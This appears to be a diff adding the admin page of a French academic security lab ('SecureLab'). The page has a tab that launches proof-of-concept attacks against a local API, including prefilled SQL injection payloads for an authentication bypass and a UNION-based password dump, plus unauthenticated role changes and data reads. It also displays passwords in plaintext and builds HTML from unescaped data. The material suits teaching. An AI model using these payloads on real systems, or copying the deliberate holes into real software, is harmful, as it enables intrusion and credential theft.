@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>SecureLab - Admin</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family:monospace; background:#0d1117; color:#e6edf3; }
+    header { background:#161b22; border-bottom:1px solid #30363d; padding:.9rem 2rem; display:flex; justify-content:space-between; align-items:center; }
+    header h1 { font-size:1.1rem; color:#58a6ff; }
+    .btn { padding:.4rem 1rem; border:none; border-radius:5px; cursor:pointer; font-family:monospace; font-size:.8rem; margin-left:.3rem; }
+    .red  { background:#da3633; color:#fff; }
+    .blue { background:#1f6feb; color:#fff; }
+    main { padding:2rem; }
+    .tabs { display:flex; gap:.5rem; margin-bottom:1.5rem; }
+    .tab { padding:.5rem 1.2rem; background:#161b22; border:1px solid #30363d; border-radius:5px; cursor:pointer; font-size:.85rem; }
+    .tab.active { background:#1f6feb; border-color:#1f6feb; color:#fff; }
+    .panel { display:none; }
+    .panel.active { display:block; }
+    table { width:100%; border-collapse:collapse; font-size:.82rem; }
+    th { background:#161b22; padding:.6rem .8rem; text-align:left; border-bottom:1px solid #30363d; color:#8b949e; }
+    td { padding:.55rem .8rem; border-bottom:1px solid #21262d; }
+    .abox { background:#1a0a0a; border:1px solid #f85149; border-radius:6px; padding:1.2rem; margin-bottom:1rem; }
+    .abox h3 { color:#f85149; font-size:.9rem; margin-bottom:.4rem; }
+    .abox p { font-size:.78rem; color:#8b949e; margin-bottom:.7rem; }
+    input[type=text] { background:#0d1117; border:1px solid #30363d; border-radius:5px; color:#e6edf3; padding:.4rem .7rem; font-family:monospace; font-size:.82rem; width:300px; margin-right:.3rem; }
+    select { background:#0d1117; border:1px solid #30363d; border-radius:5px; color:#e6edf3; padding:.4rem .7rem; font-family:monospace; font-size:.82rem; margin-right:.3rem; }
+    pre { background:#0d1117; border:1px solid #30363d; border-radius:5px; padding:.8rem; font-size:.78rem; overflow-x:auto; margin-top:.7rem; max-height:150px; overflow-y:auto; }
+    .ok  { color:#3fb950; }
+    .err { color:#f85149; }
+    .warn { background:#3d1f00; border:1px solid #d29922; border-radius:6px; padding:.6rem 1rem; font-size:.75rem; color:#d29922; margin-bottom:1.2rem; }
+    .badge { padding:.2rem .5rem; border-radius:4px; font-size:.72rem; font-weight:bold; }
+    .admin { background:#3d1f00; color:#d29922; border:1px solid #d29922; }
+    .user  { background:#0d2b3e; color:#58a6ff; border:1px solid #388bfd; }
+  </style>
+</head>
+<body>
+<header>
+  <h1>SecureLab - Admin Panel</h1>
+  <div><span id="cu" style="font-size:.8rem;color:#8b949e"></span>
+    <button class="btn red" onclick="logout()">Deconnexion</button>
+  </div>
+</header>
+<main><div class="warn">Panel de demonstration - Environnement academique uniquement</div>
+  <div class="tabs">
+    <div class="tab active" onclick="show('users')">Utilisateurs</div>
+    <div class="tab" onclick="show('attacks')">Attaques POC</div>
+    <div class="tab" onclick="show('logs')">Audit Logs</div>
+  </div>
+
+  <div id="tab-users" class="panel active">
+    <button class="btn blue" onclick="loadUsers()" style="margin-bottom:.8rem">Rafraichir</button>
+    <table>
+      <thead><tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th><th>Password (VULN)</th><th>Action</th></tr></thead>
+      <tbody id="ut"><tr><td colspan="6">Chargement...</td></tr></tbody>
+    </table></div>
+
+  <div id="tab-attacks" class="panel">
+    <div class="abox">
+      <h3>Attaque 1 - SQLi Auth Bypass</h3>
+      <p>Se connecter sans mot de passe valide via injection SQL.</p>
+      <input type="text" id="a1u" value="' OR '1'='1'--">
+      <input type="text" id="a1p" value="anything" style="width:100px">
+      <button class="btn red" onclick="atk1()">Lancer</button>
+      <pre id="r1">En attente...</pre>
+    </div>
+    <div class="abox">
+      <h3>Attaque 2 - Elevation de privilege</h3><p>Modifier un role sans session admin.</p>
+      <span style="font-size:.8rem;color:#8b949e">User ID : </span>
+      <input type="text" id="a2i" value="2" style="width:50px">
+      <select id="a2r"><option>admin</option><option>user</option></select>
+      <button class="btn red" onclick="atk2()">Lancer</button>
+      <pre id="r2">En attente...</pre>
+    </div>
+    <div class="abox">
+      <h3>Attaque 3 - Acces /api/users sans auth</h3>
+      <p>Recuperer tous les utilisateurs sans etre connecte.</p><button class="btn red" onclick="atk3()">Lancer</button>
+      <pre id="r3">En attente...</pre>
+    </div>
+    <div class="abox">
+      <h3>Attaque 4 - SQLi UNION via recherche</h3>
+      <p>Exfiltrer des donnees via injection dans /api/search.</p>
+      <input type="text" id="a4q" value="' UNION SELECT id,username,password,role FROM users--" style="width:420px">
+      <button class="btn red" onclick="atk4()">Lancer</button>
+      <pre id="r4">En attente...</pre>
+    </div>
+    <div class="abox">
+      <h3>Attaque 5 - Acces logs admin sans auth</h3>
+      <p>Acceder a /api/admin/logs sans session.</p>
+      <button class="btn red" onclick="atk5()">Lancer</button><pre id="r5">En attente...</pre>
+    </div>
+  </div>
+
+  <div id="tab-logs" class="panel">
+    <button class="btn blue" onclick="loadLogs()" style="margin-bottom:.8rem">Rafraichir</button>
+    <table>
+      <thead><tr><th>ID</th><th>User ID</th><th>Action</th><th>IP</th><th>Timestamp</th></tr></thead>
+      <tbody id="lt"><tr><td colspan="5">Chargement...</td></tr></tbody>
+    </table>
+  </div>
+</main>
+<script> var API = 'http://192.168.111.135:3000';
+  var u = JSON.parse(sessionStorage.getItem('user') || '{}');
+  document.getElementById('cu').textContent = u.username ? u.username + ' (' + u.role + ')' : 'Non connecte';
+
+  function show(n) {
+    var tabs = ['users','attacks','logs'];
+    tabs.forEach(function(t, i) {
+      document.querySelectorAll('.tab')[i].classList.toggle('active', t === n);
+      document.getElementById('tab-' + t).classList.toggle('active', t === n);
+    });
+    if (n === 'users') loadUsers();
+    if (n === 'logs') loadLogs();
+  }function loadUsers() {
+    fetch(API + '/api/users', { credentials:'include' })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+      document.getElementById('ut').innerHTML = Array.isArray(d)
+        ? d.map(function(u) {
+            return '<tr><td>' + u.id + '</td><td>' + u.username + '</td><td>' + u.email + '</td>'
+              + '<td><span class="badge ' + u.role + '">' + u.role + '</span></td>'
+              + '<td style="color:#f85149">' + u.password + '</td>'
+              + '<td><select id="r' + u.id + '"><option' + (u.role==='user'?' selected':'') + '>user</option>'
+              + '<option' + (u.role==='admin'?' selected':'') + '>admin</option></select>'
+              + '<button class="btn blue" onclick="chgRole(' + u.id + ')">OK</button></td></tr>';
+          }).join('') : '<tr><td colspan="6" class="err">' + JSON.stringify(d) + '</td></tr>';
+    });
+  }
+
+  function chgRole(id) {
+    var role = document.getElementById('r' + id).value;
+    fetch(API + '/api/users/' + id + '/role', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      credentials:'include', body: JSON.stringify({ role: role })
+    }).then(function(r) { return r.json(); })
+    .then(function(d) {
+      alert(d.success ? 'Role mis a jour' : 'Erreur : ' + (d.error || ''));
+      loadUsers();
+    });
+  }function loadLogs() {
+    fetch(API + '/api/admin/logs', { credentials:'include' })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+      document.getElementById('lt').innerHTML = Array.isArray(d)
+        ? d.map(function(l) {
+            return '<tr><td>' + l.id + '</td><td>' + (l.user_id||'-') + '</td><td>' + l.action
+              + '</td><td>' + (l.ip_address||'-') + '</td><td>' + (l.timestamp||'-').slice(0,19) + '</td></tr>';
+          }).join('')
+        : '<tr><td colspan="5" class="err">' + JSON.stringify(d) + '</td></tr>';
+    });
+  }
+function doReq(el, url, opts) {
+    document.getElementById(el).textContent = 'En cours...';
+    fetch(url, opts || {})
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+      document.getElementById(el).className = 'ok';
+      document.getElementById(el).textContent = JSON.stringify(d, null, 2);
+    })
+    .catch(function(e) {
+      document.getElementById(el).className = 'err';
+      document.getElementById(el).textContent = e.message;
+    });
+  }function atk1() {
+    doReq('r1', API + '/api/login', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ username: document.getElementById('a1u').value, password: document.getElementById('a1p').value })
+    });
+  }
+  function atk2() {
+    doReq('r2', API + '/api/users/' + document.getElementById('a2i').value + '/role', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ role: document.getElementById('a2r').value })
+    });
+  }
+  function atk3() { doReq('r3', API + '/api/users'); }
+  function atk4() { doReq('r4', API + '/api/search?q=' + encodeURIComponent(document.getElementById('a4q').value)); }
+  function atk5() { doReq('r5', API + '/api/admin/logs'); }function logout() {
+    fetch(API + '/api/logout', { method:'POST', credentials:'include' }).catch(function(){});
+    sessionStorage.clear();
+    location.href = 'index.html';
+  }
+
+  loadUsers();
+</script>
+</body>
+</html>
